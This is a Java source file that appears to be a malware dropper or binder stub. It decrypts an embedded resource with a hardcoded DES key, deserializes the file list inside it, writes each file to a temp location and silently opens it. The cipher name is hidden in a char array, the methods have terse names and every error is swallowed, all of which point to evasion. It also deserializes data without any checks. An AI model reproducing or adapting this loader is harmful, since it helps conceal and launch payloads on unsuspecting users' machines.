package com;

import java.awt.Desktop;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class Main {

    public static String ppp = "AJHSJKDFHASJDFHW2EFAHSDJFHASKA"; //password 

    public static void main(String args[]) {
        new Main().start();
    }

    public void start() {
        try {
            List<F> listaAdjuntos = (List<F>) Main.l(Main.a("/file.bin"));
            if (listaAdjuntos != null) {
                ByteArrayInputStream entrada;
                File destino;
                FileOutputStream salida;
                byte[] BUFFER;
                for (F archivo : listaAdjuntos) {
                    destino = File.createTempFile("tmp", archivo.getNombre());
                    //entrada = new ByteArrayInputStream(Main.descomprimirGZIP(archivo.getIcono()));
                    entrada = new ByteArrayInputStream(archivo.getContenido());
                    salida = new FileOutputStream(destino);
                    BUFFER = new byte[1024];
                    int i;
                    while ((i = entrada.read(BUFFER)) > -1) {
                        salida.write(BUFFER, 0, i);
                    }
                    salida.close();
                    entrada.close();
                    try {
                        Desktop.getDesktop().open(destino.getAbsoluteFile());
                    } catch (IOException e) {
                    }
                }
            }
        } catch (Exception ex) {
        }
    }

    //leer objeto
    public static Object l(InputStream stream) throws Exception, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(stream);
        Object object = in.readObject();
        in.close();
        in = null;
        return object;
    }


    //descifrar
    public static InputStream a(String name) {
        byte[] tmp = null;
        try {
            InputStream m = Main.class.getResourceAsStream(name);
            if (m == null) {
                return null;
            }
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int i;
            while ((i = m.read(buf)) > -1) {
                b.write(buf, 0, i);
            }
            b.close();
            try {
                //tmp = Util.descomprimirGZIP(d(Main.ppp, b.toByteArray()));
                tmp = d(Main.ppp, b.toByteArray());
                return new ByteArrayInputStream(tmp);
            } catch (Exception e) {
                return Main.class.getResourceAsStream(name);
            }
        } catch (Exception ex) {
            return Main.class.getResourceAsStream(name);
        }
    }

    //descifrar
    public static byte[] d(String ppp, byte[] datos) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            SecretKeyFactory skf = SecretKeyFactory.getInstance(new String(new char[]{'D', 'E', 'S'}));
            DESKeySpec kspec = new DESKeySpec(ppp.getBytes());
            SecretKey ks = skf.generateSecret(kspec);
            Cipher c = Cipher.getInstance(new String(new char[]{'D', 'E', 'S'}));
            c.init(2, ks);
            byte[] tmp = c.update(datos, 0, datos.length);
            out.write(tmp);
            tmp = c.doFinal();
            out.write(tmp);
            out.close();
            return out.toByteArray();
        } catch (Exception ex) {
        }
        return null;
    }
}
